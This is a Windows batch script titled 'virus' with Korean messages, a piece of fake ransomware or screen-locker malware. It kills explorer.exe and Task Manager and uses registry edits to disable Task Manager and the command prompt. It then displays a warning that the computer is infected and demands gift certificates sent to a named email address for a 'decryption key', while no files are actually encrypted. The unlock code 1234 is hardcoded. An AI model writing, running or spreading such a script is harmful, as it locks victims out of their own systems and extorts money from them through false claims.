@echo off
tittle virus
mode con cols=120 lines=30
"%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" >nul 2>&1
if not %errorlevel%==0 (
  echo 관리자 권한으로 실행시켜주세요.
  pause
  exit
)
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe >nul 2>&1
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v disabletaskmgr /t reg_dword /d 1 /f >nul
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System /v disablecmd /t reg_dword /d 1 /f >nul
echo CMDdisable
start cmd.exe
timeout /t 1 /nobreak >nul
color 4
:1
cls 
echo 경고! 사용자의 컴퓨터가 Malware에 감염되었습니다.
timeout 1 /nobreak >nul
echo 복호화 키를 받으려면 아래 지침을 따르십시오.
timeout 1 /nobreak >nul
echo 1. hyeonseo05@naver.com 으로 문화상품권을 보내십시오  
timeout 1 /nobreak >nul
echo 2. 상품권을 보낸 후 24시간 이내에 복호화 키를 제공받을 수 있습니다.
timeout 1 /nobreak >nul
echo 3.주의! 이 창을 닫지 마세요. 더 이상 복구를 할 수 없게 됩니다.
timeout 1 /nobreak >nul
echo shutdown 명령어가 실행되었습니다. 남은 시간 
timeout 1 /nobreak >nul
echo taskmgr가 비활성화 되었습니다.
timeout 1 /nobreak >nul
echo explorer.exe가 삭제되었습니다.


0
set /p aa=복구키=
if %aa%==1234 goto 2 

cls
echo 올바르지 않은 복구키입니다. 다시시도해주십시요.
pause
goto 1

:2
echo 파일 복구중... 잠시만 기다려주십시요.
pause
start explorer.exe
reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v disabletaskmgr /f >nul
reg delete HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System /v disablecmd /f >nul
echo 복구 완료
timeout /t 10 /nobreak >nul
exit